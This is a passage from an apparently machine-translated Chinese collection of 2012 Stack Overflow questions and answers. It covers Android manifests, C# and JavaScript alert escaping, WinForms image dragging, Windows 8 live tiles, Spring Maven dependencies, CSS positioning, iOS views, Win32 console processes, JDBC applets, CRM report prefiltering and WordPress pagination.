有人知道这种类型的错误日志吗？我的 SplashScreenActivity 在那里，它在清单中定义为应用程序的入口点，如下所示：

```
 <application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/Theme.Sherlock" >
    <uses-library android:name="com.google.android.maps" />
    <activity
        android:label="@string/app_name"
        android:name=".ui.SplashActivity" 
        android:theme="@android:style/Theme.NoTitleBar"
        android:configChanges="keyboard|keyboardHidden|orientation"
        android:screenOrientation="portrait">
        <intent-filter >
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity> 
```

使用库的放置会成为清单中的问题吗？

我无法在我的任何 android 设备上重现此问题，因此非常感谢您在查找可能导致此问题的原因方面的任何帮助。

# c# - 警报弹出窗口中的换行符

> ID：12603700
> 
> 赞同：6
> 
> 时间：2012-09-26T14:12:57.893
> 
> 标签：c#, javascript, asp.net

我正在尝试添加新行 Javascript 警报消息。我尝试了“\n”和“Environment.NewLine”。我收到未终止的字符串常量错误。你能告诉我可能是什么问题吗？我很感激任何帮助。我也试过\r\n。

```
string msg = "Your session will expire in 10 minutes. \n Please save your work to avoid this.";

if (!this.ClientScript.IsStartupScriptRegistered(ID)) 
   this.ClientScript.RegisterStartupScript(GetType(), ID, String.Format("<script language=JavaScript>setTimeout(\'alert(\"{1}\");\',{0}*1000);</script>", sTime, msg)); 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-26T14:19:27.953

我怀疑您需要将代码更改为；

```
string msg = "Your session will expire in 10 minutes. \\n Please save your work to avoid this."; 
```

并转义，`\n`否则您输出的代码实际上将包含换行符而不是`\n`

您的输出代码如下所示：

```
setTimeout('alert("Your Session....
 Please save your work to ....");', 1000); 
```

而不是：

```
setTimeout('alert("Your Session....\n Please save your work to ....");', 1000); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:17:16.527

我不确定，但我认为 \n 在 string.Format 方法中被转义，如 \"。也许你应该使用 \\n 代替。

已编辑：当我发布时，\\n 的第一个 \ 已被转义。xD

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T14:17:24.803

乍一看，我会说主要问题是您正在逃避`'`警报周围的角色。由于您的字符串由双引号定义，因此您无需转义此字符。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:14:30.573

在字符串的开头添加“@” - 像这样：

```
string msg = @"Your session ...."; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-26T14:15:12.803

代码看起来不错，所以我猜测您使用的消息本身包含`'`引号，导致 JS 语法错误。为了将动态文本插入到 Javascript 代码块中，您确实应该使用 JSON 来使您的 C# 字符串“安全”以在 JS 中使用。

考虑 JSON 是防止 JS 等效的 SQL 注入攻击的首选方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-26T14:19:23.523

`@`在开头添加 a应该会有所帮助。

# asp.net - 获取 System.Net.ConnectStream。asp.net（视觉基础）

> ID：12603704
> 
> 赞同：0
> 
> 时间：2012-09-26T14:13:18.657
> 
> 标签：asp.net

我是新手^^我正在为我的论文做一个项目，我必须从我的数据库中的一些数据生成一个二维码。这实际上是我的第二个问题，我的第一个问题是

*   我用这个代码来编码一个二维码

**代码隐藏

```
Imports Esponce.QRCode
Imports System.IO

Partial Class QR
Inherits System.Web.UI.Page

  Protected Sub Button1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Button1.Click

    Dim client = New QRCodeClient()
    Dim stream = client.Generate("Hello World")

    Literal1.Text = stream.ToString

  End Sub
End Class 
```

它调试然后仅在单击按钮时显示： System.Net.ConnectStream :(

我能否获得一些帮助以了解如何实际查看生成的 QR 码？

谢谢各位^_^

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T17:04:02.277

您的 QR 码将是一个图像，因此您无法真正在文本框中显示它，除非您想要 BASE64 编码的二进制值。

你应该能够做到：

```
System.Drawing.Image img = System.Drawing.Image.FromStream(stream);
img.Save(Server.MapPath("/images/img.png")); 
```

将图像控件添加到页面名称为“myImage”

```
myImage.ImageUrl = "/images/img.png"; 
```

您将需要图像目录的“写入”权限

编辑：如果 QRCodeClient 生成 jpeg 或 gif，请更改扩展名。

# c# - winform在图片框内移动图像

> ID：12603709
> 
> 赞同：8
> 
> 时间：2012-09-26T14:13:44.970
> 
> 标签：c#, winforms

我已经尝试了几个小时了，但是对于我的生活，我无法做到这一点。

我要做的只是移动在winform应用程序的图片框中找到的图像。我的图像大约为 1000x1000 像素，而我的框是任意的，例如 400x500，因此，例如，当我单击鼠标时，我希望图像向左移动 50。但图像框应保持相同大小。

然而，就我的一生而言，我无法让它发挥作用。我能够做的是以下几点：

```
 if (kinectController.hands[0].fingertips.Count == 1)
        {
            pictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;

        } 
```

此功能适用于我的 kinect 手指跟踪应用程序。因此，当应用程序在屏幕上找到一个可见的取景器点时，图像就会居中。但是，我最终希望图像随着我的手指移动而移动，这将在我完成将图像向一侧移动几个像素的基本步骤后实现。

对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-27T16:34:55.710

我做了一些研究，显然在 PictureBox 中移动图像并非易事，至少我找不到任何可以使这成为可能的东西（虽然不是说没有办法做到这一点）。

但是，我想出了一些“解决方法”，看看这是否符合您的需求。要做到这一点：

*   创建一个 Panel 控件，并将其调整为您想要显示的图像大小
*   在该面板内放置一个带有您的图像的 PictureBox 控件，并将 SizeMode 属性设置为 AutoSize。

现在，将此代码放入您的表单中

```
private bool Dragging;
private int xPos;
private int yPos;
private void pictureBox1_MouseUp(object sender, MouseEventArgs e) { Dragging = false; }
private void pictureBox1_MouseDown(object sender, MouseEventArgs e) {
    if (e.Button == MouseButtons.Left) { 
        Dragging = true;
        xPos = e.X;
        yPos = e.Y;
    }
}
private void pictureBox1_MouseMove(object sender, MouseEventArgs e) {
    Control c = sender as Control;
    if (Dragging && c!= null) {
        c.Top = e.Y + c.Top - yPos;
        c.Left = e.X + c.Left - xPos;
    }
} 
```

现在，每当您单击并拖动 PictureBox 时，它实际上不会移动其中的图像，而是面板内的 PictureBox 控件。同样，不完全是您正在寻找的东西，我不确定这将如何转换为 Kinect，但我希望这能让您走上正轨。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-08-29T16:57:54.383

没有足够的声誉发表评论，但如果有人需要更多地控制移动的图像，我想添加 Ben Black 的答案，这样你就不能将图像移动到它的边界之外：

```
 private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
    {
        Control c = sender as Control;
        if (Dragging && c != null)
        {
            int maxX = pictureBox1.Size.Width * -1 + panel.Size.Width;
            int maxY = pictureBox1.Size.Height * -1 + panel.Size.Height;

            int newposLeft = e.X + c.Left - xPos;
            int newposTop = e.Y + c.Top - yPos;

            if (newposTop > 0)
            {
                newposTop = 0;
            }
            if (newposLeft > 0)
            {
                newposLeft = 0;
            }
            if (newposLeft < maxX)
            {
                newposLeft = maxX;
            }
            if (newposTop < maxY)
            {
                newposTop = maxY;
            }
            c.Top = newposTop;
            c.Left = newposLeft;

        }
    } 
```

# c# - 更新适当大小的活动磁贴？

> ID：12603719
> 
> 赞同：2
> 
> 时间：2012-09-26T14:14:17.550
> 
> 标签：c#, microsoft-metro

在 Windows 8 中更新动态磁贴时，我不知道如何同时更新“大”和“小”尺寸的磁贴。

我希望将我的应用固定在小模式下的用户知道我的程序中有多少项目可供查看，而将我的应用固定在大模式下的用户既有这些，也有一些示例项目标题。

但是，无论我做什么，似乎只有一个磁贴更新到达。如何根据我的磁贴大小提供磁贴更新，以便拥有小磁贴或大磁贴的人不会失望？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T15:53:02.607

方形和宽磁贴格式的内容可以（并且应该）包含在定义每个磁贴通知的 XML 中。在`visual`元素下，只需添加两个`binding`元素：一个使用宽磁贴模板，一个使用方形磁贴模板。

```
<tile>
    <visual lang="en-US">
        <binding template="TileWideText03">
            <text id="1">Hello World!</text>
        </binding>
        <binding template="TileSquareText04">
            <text id="1">Hello World!</text>
        </binding>
    </visual>
</tile> 
```

NotificationsExtensions 库（在[MSDN tile 示例](http://code.msdn.microsoft.com/windowsapps/App-tiles-and-badges-sample-5fc49148)中找到）提供了一个对象模型来轻松操作 XML 并组合方形和宽 tile 内容：

```
// create the wide template 
ITileWideText03 tileContent = TileContentFactory.CreateTileWideText03(); 
tileContent.TextHeadingWrap.Text = "Hello World!"; 

// create the square template and attach it to the wide template 
ITileSquareText04 squareContent = TileContentFactory.CreateTileSquareText04(); 
squareContent.TextBodyWrap.Text = "Hello World!"; 
tileContent.SquareContent = squareContent; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-04T10:53:11.340

tile XML 需要组合成如下所示：

```
<tile>
    <visual version="3">
        <binding template="TileSquare150x150Block" fallback="TileSquareBlock">
            <text id="1">01</text> 
            <text id="2">Tue</text> 
        </binding>
        <binding template="TileWide310x150PeekImageAndText01" fallback="TileWidePeekImageAndText01">
            <image id="1" src="ms-appx:///Assets/WideLogo.png" /> 
            <text id="1">some text</text> 
        </binding>
    </visual>
</tile> 
```

现在有很多方法可以让你的 XML 变成这种形式，但我最喜欢的方法是使用[NotificationsExtensions 库](https://msdn.microsoft.com/en-us/library/windows/apps/hh969156.aspx)，因为它封装了 XML 操作。

在项目中引用该库后，您的代码应如下所示：

```
// create the wide template
ITileWide310x150PeekImageAndText01 wideContent = TileContentFactory.CreateTileWide310x150PeekImageAndText01();
wideContent.TextBodyWrap.Text = "some text";
wideContent.Image.Src = "ms-appx:///Assets/WideLogo.png";

// create the square template and attach it to the wide template 
ITileSquare150x150Block squareContent = TileContentFactory.CreateTileSquare150x150Block();
squareContent.TextBlock.Text = "01";
squareContent.TextSubBlock.Text = "Tue";
wideContent.Square150x150Content = squareContent;

var tn = new TileNotification(wideContent.GetXml());
TileUpdateManager.CreateTileUpdaterForApplication("App").Clear();
TileUpdateManager.CreateTileUpdaterForApplication("App").Update(tn); 
```

# spring - mssing 包 org.springframework.web

> ID：12603723
> 
> 赞同：6
> 
> 时间：2012-09-26T14:14:28.547
> 
> 标签：spring, maven

我继续学习 maven 并试图理解为什么我得到这个错误包“org.springframework.web.servlet 不存在”，而 org.springframework.web 依赖项已经在 pom.xml 中定义。

```
 <groupId>com.home.springtraining</groupId
<artifactId>SpringTrainingTemplate</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>
  <name>SpringTrainingTemplate</name>
  <url>http://maven.apache.org</url>
  <properties>
<spring.version>3.1.1.RELEASE</spring.version>
<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>
  <dependencies>
<dependency>
<groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>${spring.version}</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>${spring.version}</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-beans</artifactId>
    <version>${spring.version}</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-web</artifactId>
    <version>${spring.version}</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-jdbc</artifactId>
    <version>${spring.version}</version>
</dependency>
<dependency>    
    <groupId>commons-logging</groupId>  
    <artifactId>commons-logging</artifactId>  
    <version>1.1.1</version>  
</dependency>
<dependency>    
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.3</version>  
</dependency>
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>servlet-api</artifactId>
    <version>2.4</version>
</dependency>
<dependency>
  <groupId>junit</groupId>
  <artifactId>junit</artifactId>
  <version>3.8.1</version>
  <scope>test</scope>
</dependency> 
```

你能告诉我为什么会出现这个错误吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-26T14:18:29.620

`org.springframework.web.servlet`是 Spring MVC 的一部分，它位于`org.springframework:spring-webmvc`工件中：

```
<dependency> 
    <groupId>org.springframework</groupId> 
    <artifactId>spring-webmvc</artifactId> 
    <version>${spring.version}</version> 
</dependency> 
```

`org.springframework:spring-web`包含在 Web 应用程序中使用 Spring 的常用功能，它不依赖于 Spring MVC。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:19:06.177

将此依赖项添加到您的 pom.xml

```
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>3.1.1.RELEASE</version>
</dependency> 
```

# html - 顶部：-50% 不工作？

> ID：12603727
> 
> 赞同：3
> 
> 时间：2012-09-26T14:14:50.803
> 
> 标签：html, css

使用本[教程](http://www.andy-howard.com/verticalAndHorizontalAlignment/index.html)中的示例为我的网站制作独特的 CSS 时，我在[代码](http://jsfiddle.net/Cmeyb/6/)中发现了一个问题：

# HTML

```
<div class="items">
  <div class="outerContainer">
      <div class="innerContainer">
          <div class="element"><a href="#">Finally over four lines, all the code is the same for each list</a></div>
      </div>
  </div>
</div> 
```

# CSS

```
.items .outerContainer
{
    height: 180px;
    width: 200px;
    background-color: #EBEBEB;
    position: relative;    
}

.items .outerContainer .innerContainer
{
    width: 100%;
    text-align: center;
    position: absolute;
    top: 50%;
    background-color:red;    
}

.items .outerContainer .innerContainer .element
{
    position: relative;
    top: -50%;
} 
```

为什么`top: -50%;`不`.items .outerContainer .innerContainer .element`将元素“移动”到顶部？例如，如果我写得`top: -20px`很好，但我想要 %.

为什么？我该如何解决？

奇怪，它只适用于 IE7 :)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:18:36.197

按百分比移动元素需要包含元素具有高度属性。所以如果你把 height:90px; （我认为这是正确的，因为该项目高 180 像素，内部容器应距顶部 50%）它应该可以工作。

# ios - UIScrollView 中的 UITableView

> ID：12603729
> 
> 赞同：0
> 
> 时间：2012-09-26T14:14:54.317
> 
> 标签：ios, uitableview, uiscrollview

我这边有问题。所以我要做的是在分页的 UIScrollView 中添加几个 TableView。我有一个名为 CustomView 的类，它是 UITableView 类。它可以作为表格视图单独工作。所以它没有问题。所以我尝试在 .h 文件中像这样添加它们：

```
#import <UIKit/UIKit.h>

    @interface PagedScrollViewController : UIViewController {

    UIScrollView *scrollView;

}

@property (nonatomic, retain) IBOutlet UIScrollView *scrollView;

@end 
```

并以 .m 为单位：

```
 @synthesize scrollView;

        - (void)viewDidLoad
        {
            [super viewDidLoad];
            int numberOfPages = 3;
            for (int i = 0; i < numberOfPages; i++) {
                CGRect frame = CGRectMake(self.scrollView.frame.size.width * i,
                                      0.0,
                                      self.scrollView.frame.size.width,
                                      self.scrollView.frame.size.height);
            CustomView *customView = [[CustomView alloc] initWithStyle:UITableViewStyleGrouped];
            customView.view.frame = frame;
            [self.scrollView addSubview:customView.view];
        }

        self.scrollView.contentSize = CGSizeMake(self.scrollView.frame.size.width * numberOfPages,
                                                 self.scrollView.frame.size.height - self.navigationController.navigationBar.frame.size.height);

    } 
```

它只显示一个没有任何单元格的空表视图。我究竟做错了什么？顺便说一句，在我开始使用故事板之前，它工作得很好。先感谢您。

更重要的是，在 iOS 5 上，我在控制台中得到一个 Sigabrt：由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[CALayer numberOfSectionsInTableView:]: unrecognized selector sent to instance 0x6a2fc00”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:24:44.390

尝试这个

```
[customView.tableView reloadData] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:22:05.593

我认为`UITableViewDataSource`如果你没有实施，你必须实施 require 方法。

喜欢：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
```

# c - 如何检测带有 CREATE_NEW_PROCESS_GROUP 的进程集以及为什么 GetConsoleProcessList(..) 返回带有 CREATE_NEW_CONSOLE 标志的进程？

> ID：12603735
> 
> 赞同：1
> 
> 时间：2012-09-26T14:15:08.930
> 
> 标签：c, windows, winapi, windows-7

我正在尝试`SIGTERM`在 Windows 中使用`GenerateConsoleCtrlEvent(..)`. 我读到的条件应该是新进程在一个新进程组中并共享调用进程的控制台。关于这项工作，我有两个问题——

1.  `CREATE_NEW_PROCESS_GROUP`给定一个进程 ID，如果进程是用标志 创建的，是否可以确定使用任何当前的 Windows API ？

2.  `GetConsoleProcessList(..)`给我所有属于调用进程控制台的进程，包括用`CREATE_NEW_CONSOLE`标志创建的进程。这看起来像是一个惊喜，所以有人可以澄清它的含义吗？

# objective-c - 重叠另一个应用程序后可可应用程序不重绘

> ID：12603738
> 
> 赞同：0
> 
> 时间：2012-09-26T14:15:17.503
> 
> 标签：objective-c, macos, cocoa, drawrect

在我将应用程序覆盖在以前的应用程序上后，我返回到以前的应用程序并遇到一些错误：

*   某些组件已消失
*   使组件可见的唯一方法是调整窗口大小
*   这似乎重新绘制了整个画布。

* * *

1.  奇怪的是，只有几个组件和绘制的图像丢失了
2.  它并不总是发生，但只有几次
3.  我还没有找到重现问题的可靠方法。

有人知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-04T22:37:16.990

我遇到了完全相同的问题（视图仅在调整大小后才正确更新），除了我在 OSX 游戏中使用了 OpenGL 绘图。

通过添加以下内容解决了我的问题：

```
GLint vblSynch = 1;
[[self openGLContext] setValues:&vblSynch forParameter:NSOpenGLCPSwapInterval]; 
```

在我的自定义 NSOpenGLView 初始化方法中。然后我实现了：

```
- (void)drawRect:(NSRect)rect
{
    [self destroyFramebuffer]; // glDeleteFramebuffers..
    [self createFramebuffer];  // [super prepareOpenGl], glGenFrame(Render)Buffers, bind buffers, etc
    [self drawView]; // [[self openGLContext] makeCurrentContext], make some drawing, [[self openGLContext] flushBuffer]..
} 
```

像这样。

在这些更改之后，当窗口获得焦点时，它会重新绘制自身（没有任何调整大小的东西:)）。

希望这可以帮助！

# java - 通过 Applet 连接到远程数据库

> ID：12603741
> 
> 赞同：2
> 
> 时间：2012-09-26T14:15:36.417
> 
> 标签：java, jdbc, applet

我制作了一个包含 JDBC sql 连接器的小程序。在我的电脑上，我可以连接到服务器上的数据库，这样就可以了。但是当我将小程序放入浏览器时，它不起作用。当我用它加载 JDBC 时，它给了我一个错误。当我不加载档案时，它会加载，但没有连接。

现在我的问题是。如何连接？是否有可能隐藏我的数据库帐户信息。因为如果我使用 mywebsite/java/UCP.class 我可以打开它，我可以从中读取我的数据库帐户的密码......

所以也许有人可以帮我解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:25:02.367

出于安全原因，最好创建一个在您的小程序和数据库之间进行调解的 Web 端点。

更多信息在这里：

[在浏览器中执行 jdbc 小程序](https://stackoverflow.com/questions/1901404/execute-jdbc-applet-in-browser)

和这里：

[http://www.stanford.edu/dept/itss/docs/oracle/10g/java.101/b10979/applet.htm](http://www.stanford.edu/dept/itss/docs/oracle/10g/java.101/b10979/applet.htm)

# ios - 模拟器在 AQMEIOManager 上崩溃

> ID：12603743
> 
> 赞同：10
> 
> 时间：2012-09-26T14:15:44.827
> 
> 标签：ios, simulator, mpmediaplayercontroller

尝试播放音频时模拟器崩溃。

```
13:22:14.211 App [2965:5603]  <0xb03e7000> Error '!obj' trying to fetch default input device's sample rate
13:22:14.211 App [2965:5603]  <0xb03e7000> Error getting audio input device sample rate: '!obj'
13:22:14.213 App [2965:5603]  <0xb03e7000> AQMEIOManager::FindIOUnit: error '!dev' 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-26T14:18:18.477

在声音系统设置中选择“内置麦克风”而不是“Soundbooth 3.0”进行输入就可以了。

结论：模拟器似乎不喜欢除了内置麦克风之外的任何东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-07-25T09:39:42.250

我的 mac mini 没有内置麦克风，设置->声音->输入列表为空。当我插入一个外部的时它起作用了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-22T21:31:06.327

iDeveloper 的回答也为我解决了这个崩溃问题，尽管在我的情况下，音响系统设置的输入设置为我的 digidesign 卡。关键是，当输入的系统偏好设置“声音”设置设置为内部麦克风以外的其他设置时，就会发生这种崩溃。

# jquery - Jquery 似乎不只在 IE7 中工作

> ID：12603744
> 
> 赞同：2
> 
> 时间：2012-09-26T14:15:45.140
> 
> 标签：jquery, css, internet-explorer-7

我编写了 JQuery，它在检测到具有特定 CSS 类的元素时向按钮添加 CSS 属性：（在这种情况下，当页面上显示验证 div 时）

```
 <script>
        $(document).bind('DOMSubtreeModified', function () 
        {
            if ($('.errors').length)
            {
            alert('test');
            }
        });
    </script> 
```

警报显示在每个浏览器（包括 IE8 和 9）中，但不是 IE7 - 这是一个已知问题吗？有谁知道可以使用的替代方案？

**编辑：**我发现 IE7 无法执行“ `DOMSubtreeModified`”。而且我可以看到有替代方案，但需要自动调用 javascript 并检测何时发生更改，而不是使用对函数的调用来执行它。有什么建议么？

**另一个编辑：**因为它是一个 .NET MVC 网站，所以我看不到如何将 javascript 调用添加到验证绑定。javascript有没有办法检测整个页面的变化？即可以与上述代码相同的javascript代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:47:21.777

如果它只在出现验证错误时被调用，那么为什么要使用像 DOMSubtreeModified 这样广泛的事件呢？我会使用这样的自定义事件：

```
function validate() { 
  var error = false;
  //....
  //your validation code that finds an error
  if(error) {
    $(document).trigger('validationError');
  }
  //.....
}

$(document).on('validationError',function() {
   //your code that does something when an error is found
}); 
```

# sql - 对基于 SQL 的报告进行数据预过滤

> ID：12603747
> 
> 赞同：2
> 
> 时间：2012-09-26T14:15:56.783
> 
> 标签：sql, reporting-services, sql-server-2008-r2, dynamics-crm, dynamics-crm-2011

我在 Visual Studio 2008 中制作了一个基于 SQL 的报告并将其上传到 CRM。我指出您只能在“相关记录类型的表单”上运行它。我认为这会为您所在的当前记录生成 1 份报告。

事实并非如此。它为特定实体（订单）的每条记录生成一个报告，报告中每页 1 条记录。

我知道我必须使用数据预过滤（自动或特定？），但网上没有很好的例子，stackoverflow 上什至有一个线程，但我就是想不通。

链接到线程：[CRM 2011 中的 CRMAF 过滤](https://stackoverflow.com/questions/10856035/crmaf-filtering-in-crm-2011)

```
SELECT FilteredSalesOrder.customerid AS x1, FilteredAccount.accountid AS x2, FilteredSalesOrderDetail.salesorderid AS x3, FilteredSystemUser.systemuserid AS x4,
FilteredProduct.productid AS x5, FilteredAccount.address1_city, FilteredAccount.address1_line1, FilteredAccount.address1_postalcode, FilteredAccount.name AS AccountName, 
FilteredSalesOrder.ordernumber, FilteredSalesOrderDetail.quantity, FilteredSystemUser.fullname, FilteredProduct.fmcg_erpreference, FilteredProduct.name AS ProductName
FROM FilteredSalesOrder INNER JOIN FilteredAccount 
ON FilteredSalesOrder.customerid = FilteredAccount.accountid INNER JOIN FilteredSalesOrderDetail 
ON FilteredSalesOrderDetail.salesorderid = FilteredSalesOrder.salesorderid INNER JOIN FilteredProduct 
ON FilteredProduct.productid = FilteredSalesOrderDetail.productid INNER JOIN FilteredSystemUser 
ON FilteredSystemUser.systemuserid = FilteredSalesOrder.ownerid 
```

仅预过滤数据以使用**当前**订单：

*   **仅**将CRMAF_ 与SalesOrder 表一起使用，就足够了吗？

FROM FilteredSalesOrder AS CRMAF_FilteredSalesOrder INNER JOIN FilteredAccount

*   **对所有**表使用 CRMAF_ ？

编辑：

这是我在 FilteredSalesOrder 上使用 CRMAF_ 的新的整个 SQL。但可惜它不起作用。它仍然只给我机会对所有记录运行它，从而生成所有存在的销售订单（幸运的是没有那么多）。

```
SELECT CRMAF_FilteredSalesOrder.customerid AS x1, CustomerAccount.accountid AS x2, 
FilteredSalesOrderDetail.salesorderid AS x3, FilteredSystemUser.systemuserid AS x4,
FilteredProduct.productid AS x5,CRMAF_FilteredSalesOrder.fmcg_supplierid as x6,
CustomerAccount.address1_city as customerCity, CustomerAccount.address1_line1 as 
customerStreet1, CustomerAccount.address1_postalcode as customerPostalCode,
CustomerAccount.name AS CustomerAccountName, CRMAF_FilteredSalesOrder.ordernumber,
FilteredSalesOrderDetail.quantity, FilteredSystemUser.fullname, 
FilteredProduct.fmcg_erpreference, FilteredProduct.name AS ProductName, 
SupplierAccount.name as supplierAccountName, SupplierAccount.address1_city AS 
supplierCity,SupplierAccount.address1_line1 as supplierStreet1, 
SupplierAccount.address1_postalcode as supplierPostalCode, 
CRMAF_FilteredSalesOrder.requestdeliveryby, CRMAF_FilteredSalesOrder.createdon 

FROM FilteredSalesOrder AS CRMAF_FilteredSalesOrder INNER JOIN FilteredAccount AS CustomerAccount
ON CRMAF_FilteredSalesOrder.customerid = CustomerAccount.accountid INNER JOIN FilteredSalesOrderDetail 
ON FilteredSalesOrderDetail.salesorderid = CRMAF_FilteredSalesOrder.salesorderid INNER JOIN FilteredProduct 
ON FilteredProduct.productid = FilteredSalesOrderDetail.productid INNER JOIN FilteredSystemUser 
ON FilteredSystemUser.systemuserid = CRMAF_FilteredSalesOrder.ownerid INNER JOIN FilteredAccount AS SupplierAccount
ON CRMAF_FilteredSalesOrder.fmcg_supplierid = SupplierAccount.accountid 
```

解决方案：删除报告并重新部署它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T16:27:55.957

请参阅MSDN 上[的示例：制作与上下文相关的报表。](http://msdn.microsoft.com/en-us/library/gg334242.aspx)

您只需要过滤**当前**的SalesOrder。

CRM 2011 中有关自动预过滤的文档很少，但是，我认为 CRM 2011 和 CRM 4 之间并没有太大变化。因此，请参阅在 MSDN 上[的报告中使用过滤器，](http://msdn.microsoft.com/en-us/library/bb955092.aspx)了解 CRM 4 中的 SSRS 报告以获得更好的解释。

我经常在报告中使用的参数是`CRM_FilteredSalesOrder`与 SQL 查询相结合的参数，如下所示：

```
EXEC('
    SELECT FSO.*
    FROM (' + @CRM_FilteredSalesOrder + ') AS FSO
') 
```

它与自动预过滤的原理相同，但现在您可以控制预过滤器的插入位置。另请记住，在 SSRS 报告的单个查询中不能多次使用自动预过滤器。

编辑：好的，让我直接使用你的例子：

```
EXEC('
  SELECT
    FSO.customerid AS x1,
    FilteredAccount.accountid AS x2,
    FilteredSalesOrderDetail.salesorderid AS x3,
    FilteredSystemUser.systemuserid AS x4,
    FilteredProduct.productid AS x5,
    FilteredAccount.address1_city,
    FilteredAccount.address1_line1,
    FilteredAccount.address1_postalcode,
    FilteredAccount.name AS AccountName, 
    FSO.ordernumber,
    FilteredSalesOrderDetail.quantity,
    FilteredSystemUser.fullname,
    FilteredProduct.fmcg_erpreference,
    FilteredProduct.name AS ProductName
  FROM (' + @CRM_FilteredSalesOrder + ') AS FSO
  INNER JOIN FilteredAccount ON FSO.customerid = FilteredAccount.accountid
  INNER JOIN FilteredSalesOrderDetail ON FilteredSalesOrderDetail.salesorderid = FSO.salesorderid
  INNER JOIN FilteredProduct ON FilteredProduct.productid = FilteredSalesOrderDetail.productid
  INNER JOIN FilteredSystemUser ON FilteredSystemUser.systemuserid = FSO.ownerid
') 
```

如果您想了解 CRM 插入的内容，请将`CRM_FilteredSalesOrder`参数放在报表上的文本框中。`SELECT f0.* FROM FilteredSalesOrder AS f0 WHERE f0.salesorderid = '3641478b-5022-40fa-90c1-a4d407e8b99b'`当它在“相关记录类型的表单”上时，它将是表单中的一个查询。这实际上是这个特定订单的子查询。这就是他们所说的“预过滤”，您只需查询一个子查询。

# php - Wordpress (PHP) 上的自定义博客页面 - 分页

> ID：12603751
> 
> 赞同：0
> 
> 时间：2012-09-26T14:16:03.080
> 
> 标签：php, html, wordpress, loops, pagination

我正在尝试在[此页面](http://fusion.fusionconstruction.co.uk/latest-news/)上显示前 5 个带有自定义缩略图和标题的帖子 ，我只需要显示接下来 5 个帖子的标题，然后是分页。[您可以单击此处查看](http://www.cyclosport.org/)我需要的示例。（见左边的帖子）

下面是我在页面上使用的自定义模板。

```
<?php
get_header(); ?>
<div id="primary">
<div id="content" role="main">

<?php
$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
query_posts($args);
if( have_posts() ) :?>

<?php twentyeleven_content_nav( 'nav-above' );?>
<?php while ( have_posts() ) : the_post(); ?>
            <div class="post-thumb-title">
            <a href="<?php the_permalink() ?>"><?php the_post_thumbnail(array(632,305));?></a>
            <p class="thumb-title2"><?php the_title(); ?></p>
            <p class="news-date"><?php the_time('F jS, Y') ?></p>
            <div id="post-excerpt">
            <?php the_excerpt(); ?>
            </div>
            </div>
<?php endwhile; ?>
<?php twentyeleven_content_nav( 'nav-below' ); ?>

<?php else : ?>
<article id="post-0" class="post no-results not-found">
<header class="entry-header">
<h1 class="entry-title"><?php _e( 'Nothing Found', 'twentyeleven' ); ?></h1>
</header><!-- .entry-header -->

<div class="entry-content">
<p><?php _e( 'Apologies, but no results were found for the requested archive. Perhaps searching will help find a related post.', 'twentyeleven' ); ?></p>
<?php get_search_form(); ?>
</div>
<?php endif; ?>
</div>
</div>
<?php get_sidebar(); ?>
<?php get_footer(); ?> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:25:44.097

你可以试试这样的

```
<?php
// amount of posts shown with thumbnail
// post 6 .. pagesize (wp-admin > settings > reading) will be displayed as link only
$withThumb = 5; 
while ( have_posts() ) : the_post();
    if ($withThumb-- > 0) { ?>
        <div class="post-thumb-title">
            <a href="<?php the_permalink() ?>"><?php the_post_thumbnail(array(632,305));?></a>
            <p class="thumb-title2"><?php the_title(); ?></p>
            <p class="news-date"><?php the_time('F jS, Y') ?></p>
            <div id="post-excerpt">
                <?php the_excerpt(); ?>
